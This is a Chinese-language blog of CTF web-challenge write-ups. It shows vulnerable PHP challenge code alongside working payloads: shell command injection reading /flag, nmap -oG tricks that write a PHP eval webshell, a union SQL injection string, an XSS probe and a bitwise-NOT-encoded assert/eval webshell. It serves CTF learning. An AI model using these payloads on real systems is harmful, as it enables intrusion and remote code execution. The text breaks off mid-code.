class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$comm1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;comm1&#x27;</span>];</span><br><span class="line"><span class="variable">$comm2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;comm2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="variable">$comm1</span>))</span><br><span class="line">    <span class="variable">$comm1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, <span class="variable">$comm2</span>))</span><br><span class="line">    <span class="variable">$comm2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;#flag in /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$comm1</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$comm1</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$comm2</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$comm2</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;file <span class="subst">$comm1</span> <span class="subst">$comm2</span>&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>虽然comm2过滤了tac&#x2F;cat&#x2F;flag 但这里只用利用comm1即可<br>把加上的前后引号闭合掉 comm1用tac 和 fla?来绕过<br>构造payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?comm1=<span class="string">&quot;;tac /fla?;&quot;</span></span><br></pre></td></tr></table></figure><h1 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020 ]EzPHP"></a>[BJDCTF2020 ]EzPHP</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">sha1</span>(<span class="variable">$shana</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>好多好多层 一层层的看</p><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>首先要解决如何传?shana<br>这里源码用的preg_match 可以用urlencode绕过<br>这里用一个url全编码的python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    clearFlag = <span class="string">&quot;y&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> clearFlag == <span class="string">&quot;y&quot;</span> <span class="keyword">or</span> clearFlag == <span class="string">&quot;Y&quot;</span>:</span><br><span class="line">            os.system(<span class="string">&quot;cls&quot;</span>)</span><br><span class="line">        clearFlag = <span class="string">&quot;&quot;</span></span><br><span class="line">        string = <span class="built_in">input</span>(<span class="string">&quot;请输入需要转换的字符串 :&quot;</span>)</span><br><span class="line">        <span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;请选择操作类型(1：加密 2：解密) :&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">type</span> != <span class="string">&quot;1&quot;</span> <span class="keyword">and</span> <span class="built_in">type</span> != <span class="string">&quot;2&quot;</span>):</span><br><span class="line">            <span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;操作类型输入错误，请重新选择(1：加密 2：解密) :&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;1&quot;</span> :</span><br><span class="line">            encode_string = encode(string)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;编码结果为：&quot;</span>+encode_string+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;2&quot;</span> :</span><br><span class="line">            decode_string = decode(string)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;解码结果为：&quot;</span>+decode_string+<span class="string">&quot;【请注意前后空格】\n&quot;</span>)</span><br><span class="line">        clearFlag = <span class="built_in">input</span>(<span class="string">&quot;按Y/y清空屏幕继续:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">string</span>):</span><br><span class="line">    encode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encode_char = <span class="built_in">hex</span>(<span class="built_in">ord</span>(char)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>)</span><br><span class="line">        encode_string += encode_char</span><br><span class="line">    <span class="keyword">return</span> encode_string</span><br><span class="line"></span><br><span class="line"><span class="comment">#解码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">string</span>):</span><br><span class="line">    decode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    string_arr = string.split(<span class="string">&quot;%&quot;</span>)</span><br><span class="line">    string_arr.pop(<span class="number">0</span>)           <span class="comment">#删除第一个空元素</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string_arr:</span><br><span class="line">        decode_char = <span class="built_in">chr</span>(<span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+char))</span><br><span class="line">        decode_string += decode_char</span><br><span class="line">    <span class="keyword">return</span> decode_string</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>发现能够绕过</p><h2 id="2-3"><a href="#2-3" class="headerlink" title="2 . 3"></a>2 . 3</h2><p>由于我们需要传一个英文字符串 但题目又进行了过滤<br>这里学到了一个小trick<br>$_REQUEST同时接收get和post请求 且post的优先级高于get<br>也就是说我们post&#x2F;get同时传同一个名字的变量 $REQUEST会处理post的<br>所以可以用这种方式绕过</p><p>怎么绕过pregmatch+!&#x3D;&#x3D; ?<br>注意到这个preg_match是匹配开头结尾<br>可以在字符串最后加一个%0a换行符即可</p><h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>考察点: nmap命令+escapexxx组合逃逸</p><p>靶机源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="nmap-oG"><a href="#nmap-oG" class="headerlink" title="nmap -oG"></a>nmap -oG</h2><p>nmap在RCE中有个独特的用法<br>可以用 -oG 来将命令写入文件<br>比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27;&lt;?php    eval($_POST[&quot;hack&quot;]);?&gt; -oG hack3.php&#x27;</span></span><br></pre></td></tr></table></figure><p>就可以将一句话木马写入.php<br>这题另外一个考点在于escapeshellarg和escapeshellcmd组合过滤的绕过<br>这种看官方文档</p><h2 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg() 将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含exec()、system() 和执行运算符 。</span><br><span class="line"></span><br><span class="line">在 Windows 上，escapeshellarg() 用空格替换了百分号、感叹号（延迟变量替换）和双引号，并在字符串两边加上双引号。此外，每条连续的反斜线(\)都会被一个额外的反斜线所转义。</span><br></pre></td></tr></table></figure><h2 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</span><br><span class="line"></span><br><span class="line">反斜线（\）会在以下字符之前插入：&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\、\x0A 和 \xFF。 &#x27; 和 &quot; 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 % 和 ! 字符前面都有一个插入符号（^）。</span><br></pre></td></tr></table></figure><p>这两者结合起来的绕过方法就是在单引号前&#x2F;后增加空格<br>虽说我本地测试没看出任何区别… Windows下他会加上^所以看不出来</p><p>所以这么传payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27; &lt;?php eval($_POST[&quot;hack&quot;]);?&gt; -oG hack3.php &#x27;</span></span><br></pre></td></tr></table></figure><p>然后得到md5的dir 访问dir下的hack3.php post或者蚁剑都可以RCE</p><h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>与上一题相似的考点<br>题目给了一个nmap扫描接口 测试127.0.0.1发现与正常nmap扫描一样</p><p>同样的 利用 -oG 写入木马<br>但是发现被检测到了 hacker…<br>尝试用短标签&#x2F;.phtml后缀 发现还是不行<br>想到上一题是用 单引号+空格绕过两个escape<br>猜测这后端也使用了两个escape来 “保证安全”<br>所以payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &lt;?= @eval($_POST[1]); ?&gt;  -oG hack.phtml &#x27;</span></span><br></pre></td></tr></table></figure><p>访问 &#x2F;hack.phtml 发现成功写入 一键RCE即可</p><h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019 ]Web1"></a>[SWPU2019 ]Web1</h1><p>orz<br>题目给了个登陆界面 尝试下弱密码&#x2F;万能绕过 都无果<br>发现可以注册 注册登陆后是一个可以发送广告的页面<br>尝试xxs 广告内容写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&quot;233&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>发现申请后会有alert 试了试alert document.cookie 并没有flag</p><p>注意到点击广告详情会得到这样的url </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b72e1f09-61f8-4bd9-a932-5fcae1df0ae0.node5.buuoj.cn:81/detail.php?id=5</span><br></pre></td></tr></table></figure><p>这里要联想到sql 只是这里不是在id上注入<br>可以看<a href="https://blog.csdn.net/satasun/article/details/109391116" target="_blank">这篇</a><br>想想?id&#x3D;xxx 是怎么来的? 肯定不是直接从我们的广告信息读取的 发现是从1开始的cnt累加<br>那么就存在一个数据库查询的过程<br>select ID from xxx where name &#x3D; ad’s_name</p><p>而广告名是可控点 所以存在sql注入的可能性<br>后面的sql注入绕过姿势挺复杂的 等再系统学了sql再来看</p><p>最后构造的广告名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><p>考点: 无数字字母RCE+蚁剑插件绕过disable_functions(Linux下)</p><p>题目源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看<a href="https://www.cnblogs.com/pursue-security/p/15404150.html" target="_blank">这篇</a></p><p>核心思想就是利用非字母数字来通过异或&#x2F;取反&#x2F;自增来拼接出如assert之类的可动态执行的函数<br>关于assert: 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行</p><p>回到这题<br>我们尝试下取反<br>比如phpinfo取反 %8F%97%8F%96%91%99%90<br>那么构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p>就可以执行 这里利用了动态特性 注意加括号<br>构造一句话木马: 这里不能直接用eval 因为eval不是php函数 无法通过变量函数的方法进行调用 所以要用assert<br>同样的因为php版本 我们不能直接assert($_POST[xxx]) 而需要 assert(eval($_POST[xxx]))</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert取反: %<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B</span><br><span class="line">(<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]))取反: %D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%DD%<span class="number">97</span>%<span class="number">9</span>E%<span class="number">9</span>C%<span class="number">94</span>%DD%A2%D6%D6</span><br><span class="line">payload: ?code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%DD%<span class="number">97</span>%<span class="number">9</span>E%<span class="number">9</span>C%<span class="number">94</span>%DD%A2%D6%D6);</span><br><span class="line"><span class="comment">// 注意结尾分号！</span></span><br></pre></td></tr></table></figure><p>这样蚁剑连接后发现什么命令都执行不了<br>这里用蚁剑的dsiabe_functions插件 只是必须在Linux下执行<br>所以Linux下也要安装蚁剑<br>有点麻烦 过段时间再来搞…</p><h1 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><p>记一下一道最简单的反序列化pop链构造<br>题目源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span 